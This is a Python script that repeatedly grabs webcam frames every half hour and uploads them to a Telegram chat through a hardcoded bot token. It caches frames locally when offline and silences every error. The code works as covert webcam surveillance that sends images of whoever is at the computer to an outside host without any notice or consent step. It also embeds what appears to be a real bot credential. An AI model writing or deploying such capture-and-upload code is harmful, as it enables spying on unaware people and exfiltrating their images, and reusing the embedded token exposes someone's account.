import datetime
import os
import time

import cv2
import requests

BASE_URL = "https://api.telegram.org/bot7735792806:AAEG59zResZlHns4gvu0s-8rGwYQZzyD5VE"
CHAT_ID = "1802424594"
FOLDER_NAME = os.path.join(os.path.dirname(os.path.realpath(__file__)), "Activities")


def main():
    do = True
    day = 0

    while True:
        # noinspection PyBroadException
        try:
            time.sleep(1)
            now = datetime.datetime.now()
            now_day = now.day
            now_minute = now.minute

            if now_minute % 30 == 0:
                if not do:
                    continue

                do = False
                video_capture = cv2.VideoCapture(0)

                if not video_capture.isOpened():
                    continue

                time.sleep(3)
                captured, frame = video_capture.read()

                while not captured:
                    captured, frame = video_capture.read()

                time.sleep(1)
                video_capture.release()
                _, frame_png = cv2.imencode(".png", frame)

                # noinspection PyBroadException
                try:
                    requests.post(
                        f"{BASE_URL}/sendPhoto",
                        data={"chat_id": CHAT_ID},
                        files={"photo": frame_png.tobytes()}
                    )
                except Exception:
                    cv2.imwrite(
                        os.path.join(FOLDER_NAME, f"{now_day}-{now.hour * 60 + now_minute}.png"),
                        frame
                    )

                    continue

                for item in os.listdir(FOLDER_NAME):
                    item_path = os.path.join(FOLDER_NAME, item)

                    if os.path.isdir(item_path):
                        continue

                    with open(item_path, "rb") as image:
                        response = requests.post(
                            f"{BASE_URL}/sendPhoto",
                            data={"chat_id": CHAT_ID},
                            files={"photo": image}
                        )

                    if not response.ok:
                        break

                    os.remove(item_path)
            else:
                do = True

            if now_day != day:
                response = requests.post(
                    f"{BASE_URL}/sendMessage",
                    data={"chat_id": CHAT_ID, "text": f"{day} -> {now_day}"}
                )

                if response.ok:
                    day = now_day
        except Exception:
            pass


if __name__ == "__main__":
    main()
